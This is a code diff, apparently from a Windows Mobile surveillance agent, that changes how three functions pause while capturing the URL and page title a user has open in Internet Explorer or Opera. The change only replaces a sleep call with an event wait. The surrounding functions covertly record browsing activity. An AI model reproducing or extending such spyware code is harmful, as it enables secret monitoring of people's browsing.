@@ -6,7 +6,7 @@
 extern BOOL AgentSleep(UINT Id, UINT uMillisec);
 
 // IEXplore for Windows Mobile 6.0/6.1
-INT GetIE60Url(wstring &strUrl, wstring &strTitle, UINT uId) {
+INT GetIE60Url(wstring &strUrl, wstring &strTitle, HANDLE evHandle) {
 	HWND hIE, hChild;
 	WCHAR wTitle[256];
 	wstring wRetUrl;
@@ -68,7 +68,7 @@ INT GetIE60Url(wstring &strUrl, wstring &strTitle, UINT uId) {
 			return 0;
 
 		// Vediamo se l'utente sta scrivendo l'url
-		if (AgentSleep(uId, 2 * 1000))
+		if (WaitForSingleObject(evHandle, 2000) == WAIT_OBJECT_0)
 			return -1;
 
 	} while((uUrlLen = GetWindowTextLength(hChild)) != uOldUrlLen);
@@ -102,7 +102,7 @@ INT GetIE60Url(wstring &strUrl, wstring &strTitle, UINT uId) {
 }
 
 // IEXplore for Windows Mobile 6.5
-INT GetIE65Url(wstring &strUrl, wstring &strTitle, UINT uId) {
+INT GetIE65Url(wstring &strUrl, wstring &strTitle, HANDLE evHandle) {
 	HWND hIE, hChild;
 	WCHAR wTitle[256];
 	wstring wRetUrl;
@@ -171,7 +171,7 @@ INT GetIE65Url(wstring &strUrl, wstring &strTitle, UINT uId) {
 			return 0;
 
 		// Vediamo se l'utente sta scrivendo l'url
-		if (AgentSleep(uId, 2 * 1000))
+		if (WaitForSingleObject(evHandle, 2000) == WAIT_OBJECT_0)
 			return -1;
 
 	} while((uUrlLen = GetWindowTextLength(hChild)) != uOldUrlLen);
@@ -204,7 +204,7 @@ INT GetIE65Url(wstring &strUrl, wstring &strTitle, UINT uId) {
 	return 0;
 }
 
-INT GetOperaUrl(wstring &strUrl, wstring &strTitle, UINT uId) {
+INT GetOperaUrl(wstring &strUrl, wstring &strTitle, HANDLE evHandle) {
 	HWND hOpera, hChild;
 	WCHAR wTitle[256];
 	wstring wRetUrl;
@@ -258,7 +258,7 @@ INT GetOperaUrl(wstring &strUrl, wstring &strTitle, UINT uId) {
 			return 0;
 
 		// Vediamo se l'utente sta scrivendo l'url
-		if (AgentSleep(uId, 2 * 1000))
+		if (WaitForSingleObject(evHandle, 2000) == WAIT_OBJECT_0)
 			return -1;
 
 	} while((uUrlLen = GetWindowTextLength(hChild)) != uOldUrlLen);
